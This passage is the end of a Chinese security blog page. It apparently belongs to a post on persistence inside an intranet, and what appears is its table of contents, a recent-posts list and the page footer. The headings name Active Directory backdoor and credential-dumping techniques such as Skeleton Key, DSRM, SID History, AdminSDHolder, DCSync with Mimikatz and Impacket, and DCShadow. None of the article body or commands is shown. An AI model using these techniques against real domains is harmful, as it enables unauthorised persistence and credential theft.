href="#%E5%B8%B8%E8%A7%81%E5%9F%9F%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF"><span class="toc-number">1.3.</span> <span class="toc-text">常见域后门技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA-Skeleton-Key-%E5%9F%9F%E5%90%8E%E9%97%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text">创建 Skeleton Key 域后门</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.1.0.1.</span> <span class="toc-text">1.常规利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="toc-number">1.3.1.0.2.</span> <span class="toc-text">2.缓解措施</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BADSRM%E5%9F%9F%E5%90%8E%E9%97%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">创建DSRM域后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SID-History%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.3.</span> <span class="toc-text">SID History的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-SID-SID-History"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">1.SID &amp; SID History</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">2.利用方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8AdminSDHolder%E6%89%93%E9%80%A0%E4%B8%8E%E5%90%8E%E9%97%A8"><span class="toc-number">1.3.4.</span> <span class="toc-text">利用AdminSDHolder打造与后门</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-AdminSDHolder"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">1.AdminSDHolder</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">2.利用方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HOOK-PasswordChangeNotify"><span class="toc-number">1.3.5.</span> <span class="toc-text">HOOK PasswordChangeNotify</span></a></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#DCSync%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF"><span class="toc-number">1.4.</span> <span class="toc-text">DCSync攻击技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8DCSync%E5%AF%BC%E5%87%BA%E5%9F%9F%E5%86%85%E5%93%88%E5%B8%8C"><span class="toc-number">1.4.1.</span> <span class="toc-text">利用DCSync导出域内哈希</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-MimiKatz%E4%B8%8B%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.1.0.1.</span> <span class="toc-text">1.MimiKatz下利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Impacket%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.1.0.2.</span> <span class="toc-text">Impacket下的利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8DCSync%E7%BB%B4%E6%8C%81%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90"><span class="toc-number">1.4.2.</span> <span class="toc-text">利用DCSync维持域内权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DCShadow"><span class="toc-number">1.4.3.</span> <span class="toc-text">DCShadow</span></a></li></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/" title="内网权限持久化"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网权限持久化"></a><div class="content"><a class="title" href="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/" title="内网权限持久化">内网权限持久化</a><time datetime="2024-03-07T13:00:12.000Z" title="发表于 2024-03-07 21:00:12">2024-03-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/DC4%20&amp;%20DC5/" title="DC4 &amp; DC5"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC4 &amp; DC5"></a><div class="content"><a class="title" href="/2024/01/23/DC4%20&amp;%20DC5/" title="DC4 &amp; DC5">DC4 &amp; DC5</a><time datetime="2024-01-23T09:30:58.103Z" title="发表于 2024-01-23 17:30:58">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="内网信息搜集"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网信息搜集"></a><div class="content"><a class="title" href="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="内网信息搜集">内网信息搜集</a><time datetime="2024-01-23T09:30:12.000Z" title="发表于 2024-01-23 17:30:12">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/DC2%20&amp;%20DC3/" title="DC1 &amp; DC3"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC1 &amp; DC3"></a><div class="content"><a class="title" href="/2024/01/23/DC2%20&amp;%20DC3/" title="DC1 &amp; DC3">DC1 &amp; DC3</a><time datetime="2024-01-23T09:28:25.268Z" title="发表于 2024-01-23 17:28:25">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/" title="红日靶场四"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场四"></a><div class="content"><a class="title" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/" title="红日靶场四">红日靶场四</a><time datetime="2024-01-23T09:25:42.516Z" title="发表于 2024-01-23 17:25:42">2024-01-23</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2024 By Bamboo22</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
